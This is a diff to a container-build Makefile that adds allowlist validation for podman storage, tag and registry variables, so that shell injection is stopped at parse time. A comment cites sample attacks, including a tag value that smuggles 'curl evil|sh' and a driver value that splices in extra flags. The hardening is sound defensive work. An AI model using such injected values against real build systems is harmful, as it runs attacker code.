@@ -46,10 +46,55 @@ IMAGE_TAG     ?= latest
 # clobbering the system store. Unset = no flag emitted = podman default.
 # Mirrors lib/build-common.sh:podman_storage_opts so workstation builds
 # stay byte-identical to the build_qcow2 path that consumes them.
+#
+# Scope note: STORAGE_DRIVER / PODMAN_ROOT / PODMAN_RUNROOT must be set
+# for the WHOLE `make` invocation (or exported in the shell), not just
+# the push half. `podman tag` and `podman push` only see the image the
+# build placed in the alternate root if they are invoked with the same
+# --root/--runroot. Splitting the env between a `make image-*` and a
+# follow-up `make push-image-*` shell silently uses the default
+# graphroot for the second call and fails image-not-found.
 PODMAN_BUILD_OPTS := \
         $(if $(STORAGE_DRIVER),--storage-driver $(STORAGE_DRIVER),) \
         $(if $(PODMAN_ROOT),--root $(PODMAN_ROOT),) \
         $(if $(PODMAN_RUNROOT),--runroot $(PODMAN_RUNROOT),)
+
+# Shell-metachar validation for operator-supplied vars (round-2 review,
+# #234). Without this an export like
+#   STORAGE_DRIVER='overlay --runroot /etc'
+# would splice extra flags into every `podman` call below, and a
+#   make IMAGE_TAG='v1; curl evil|sh'
+# would inject shell into the tag/push lines. We validate each var
+# against a conservative allowlist of characters the upstream tool
+# documents as legal:
+#   * STORAGE_DRIVER / PODMAN_ROOT / PODMAN_RUNROOT — single tokens,
+#     alphanumeric + . _ / - (driver names + filesystem paths).
+#   * IMAGE_TAG     — OCI tag chars + version separators: A-Z a-z 0-9 . _ : / + -
+#   * GHCR_REGISTRY — registry-host + path chars:        A-Z a-z 0-9 . / : _ -
+# Each check is a no-op when the var is empty (filter-out of empty vs
+# empty is empty). Mismatch => fatal $(error) at Makefile parse time
+# (before any recipe runs), so a malicious `make IMAGE_TAG=...` aborts
+# before the first shell-out.
+_STORAGE_DRIVER_SAFE := $(shell printf %s '$(STORAGE_DRIVER)' | tr -cd 'A-Za-z0-9._/-')
+ifneq ($(strip $(STORAGE_DRIVER)),$(strip $(_STORAGE_DRIVER_SAFE)))
+$(error STORAGE_DRIVER='$(STORAGE_DRIVER)' contains characters outside [A-Za-z0-9._/-] — refusing to thread into `podman`)
+endif
+_PODMAN_ROOT_SAFE := $(shell printf %s '$(PODMAN_ROOT)' | tr -cd 'A-Za-z0-9._/-')
+ifneq ($(strip $(PODMAN_ROOT)),$(strip $(_PODMAN_ROOT_SAFE)))
+$(error PODMAN_ROOT='$(PODMAN_ROOT)' contains characters outside [A-Za-z0-9._/-] — refusing to thread into `podman`)
+endif
+_PODMAN_RUNROOT_SAFE := $(shell printf %s '$(PODMAN_RUNROOT)' | tr -cd 'A-Za-z0-9._/-')
+ifneq ($(strip $(PODMAN_RUNROOT)),$(strip $(_PODMAN_RUNROOT_SAFE)))
+$(error PODMAN_RUNROOT='$(PODMAN_RUNROOT)' contains characters outside [A-Za-z0-9._/-] — refusing to thread into `podman`)
+endif
+_IMAGE_TAG_SAFE := $(shell printf %s '$(IMAGE_TAG)' | tr -cd 'A-Za-z0-9._:/+-')
+ifneq ($(strip $(IMAGE_TAG)),$(strip $(_IMAGE_TAG_SAFE)))
+$(error IMAGE_TAG='$(IMAGE_TAG)' contains characters outside [A-Za-z0-9._:/+-] — refusing to thread into `podman tag/push`)
+endif
+_GHCR_REGISTRY_SAFE := $(shell printf %s '$(GHCR_REGISTRY)' | tr -cd 'A-Za-z0-9./:_-')
+ifneq ($(strip $(GHCR_REGISTRY)),$(strip $(_GHCR_REGISTRY_SAFE)))
+$(error GHCR_REGISTRY='$(GHCR_REGISTRY)' contains characters outside [A-Za-z0-9./:_-] — refusing to thread into `podman tag/push`)
+endif
 
 .DEFAULT_GOAL := help
 .PHONY: help \
